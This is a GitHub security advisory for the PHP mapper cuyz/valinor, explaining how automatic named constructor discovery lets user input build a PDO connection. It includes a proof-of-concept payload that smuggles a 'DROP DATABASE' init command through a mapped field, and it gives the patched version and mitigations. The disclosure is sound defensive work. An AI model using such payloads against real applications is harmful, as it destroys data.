# [H] Automatic named constructor discovery in Valinor

## Summary
Severity: High
Advisory: GHSA-xhr8-mpwq-2rr2
Ecosystem: Packagist
Published: 2022-04-01
Source: https://github.com/advisories/GHSA-xhr8-mpwq-2rr2
Type: github-advisory

## Affected
- Packagist: `cuyz/valinor` — affected >=0.5.0 <0.7.0

## Details
## Design issue - automatic constructor discovery

The issue arises when upgrading from `cuyz/valinor:0.3.0` to a newer system on an existing application, which broke due to the wrong constructor being picked.

Still, a bigger security concern is problematic, and it is akin to https://github.com/rails/rails/issues/5228.

## Example exploit

Take following DTO example:

```php
final class UserDTO
{
    public function __construct(
        public int $id,
        public string $name
    ) {}
    public static function fromDb(
        PDO $connection,
        int $id
    ): self { /* ... code to fetch the DTO here ... */ }
}
```

There is nothing inherently unsafe about the above `UserDTO`, but when mixed with `cuyz/valinor:^0.5.0` ( specifically https://github.com/CuyZ/Valinor/commit/718d3c1bc2ea7d28b4b1f6c062addcd1dde8660b ), it is an explosive mix:

```php
// this could be coming from user input:
$maliciousPayload = [
    'connection' => [
      'dsn' => 'mysql:host=some-host;database=some-database',
      'username' => 'root',
      'password' => 'root',
      'options' => [
        // PDO::MYSQL_ATTR_INIT_COMMAND === 1002
        1002 => 'DROP DATABASE all-the-moneys'
      ]
    ],
    'id' => 123,
];

$treeMapper->map(
  UserDTO::class,
  $maliciousPayload
); // your DB is gone :D
```

The above payload is represented in PHP form, but may as well be input JSON, HTML or x-form-urlencoded.

## Mitigation

Version 0.7.0 contains a patch for this issue.

Automatic named constructor resolution should be disabled - only explicitly mapped named constructors should be used/discovered.

## References
- https://github.com/CuyZ/Valinor/security/advisories/GHSA-xhr8-mpwq-2rr2
- https://github.com/CuyZ/Valinor/commit/718d3c1bc2ea7d28b4b1f6c062addcd1dde8660b
- https://github.com/CuyZ/Valinor
- https://github.com/CuyZ/Valinor/releases/tag/0.7.0
